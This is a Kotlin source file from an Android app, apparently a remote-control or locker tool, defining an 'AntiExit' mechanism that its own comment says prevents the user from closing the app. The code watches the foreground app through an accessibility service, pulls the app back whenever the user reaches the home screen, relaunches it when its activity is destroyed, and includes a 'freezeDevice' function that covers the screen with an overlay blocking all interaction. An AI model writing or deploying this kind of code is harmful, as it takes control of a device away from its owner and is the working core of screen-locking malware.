package com.xrc.app.persistence

import android.app.ActivityManager
import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.util.Log
import com.xrc.app.XRCApp
import com.xrc.app.service.XRCAccessibilityService
import kotlinx.coroutines.*

/**
 * Anti-exit mechanism that prevents the user from closing the app.
 * Uses multiple techniques to keep the app running:
 * 1. Foreground service resurrection
 * 2. Activity re-creation on destroy
 * 3. Home button interception via accessibility
 * 4. Overlay blocking
 * 5. Task killing prevention
 */
object AntiExit {

    const val TAG = "AntiExit"
    private var isEnabled = false
    private var monitoringJob: Job? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)

    fun enable() {
        if (isEnabled) return
        isEnabled = true
        Log.i(TAG, "Anti-exit enabled")

        monitoringJob = scope.launch {
            while (isActive && isEnabled) {
                val context = XRCApp.instance
                try {
                    // Check if our app is still in foreground
                    val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                    val runningTasks = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        am.getRunningServices(Int.MAX_VALUE)
                        emptyList() // getRunningTasks deprecated, alternative approach below
                    } else {
                        @Suppress("DEPRECATION")
                        am.getRunningTasks(1)
                    }

                    // Alternative: check via accessibility foreground
                    val accService = XRCAccessibilityService.instance
                    if (accService != null) {
                        val foregroundPkg = accService.getCurrentForegroundPackage()
                        if (foregroundPkg == "com.android.systemui" ||
                            foregroundPkg == "android" ||
                            foregroundPkg == "com.android.launcher" ||
                            foregroundPkg == "com.google.android.apps.nexuslauncher"
                        ) {
                            // User pressed home - bring app back
                            delay(100)
                            val launchIntent = context.packageManager.getLaunchIntentForPackage(
                                context.packageName
                            )?.apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            }
                            if (launchIntent != null) {
                                context.startActivity(launchIntent)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Monitoring error: ${e.message}")
                }
                delay(2000) // Check every 2 seconds
            }
        }
    }

    fun disable() {
        isEnabled = false
        monitoringJob?.cancel()
        Log.i(TAG, "Anti-exit disabled")
    }

    fun isEnabled(): Boolean = isEnabled

    fun onActivityDestroyed(context: Context) {
        if (!isEnabled) return
        // Recreate activity immediately
        scope.launch {
            delay(100)
            val intent = context.packageManager.getLaunchIntentForPackage(context.packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            if (intent != null) {
                context.startActivity(intent)
            }
        }
    }

    fun freezeDevice(context: Context) {
        // Fill screen with overlay blocking all interaction
        val intent = Intent(context, OverlayBlockerActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }
}
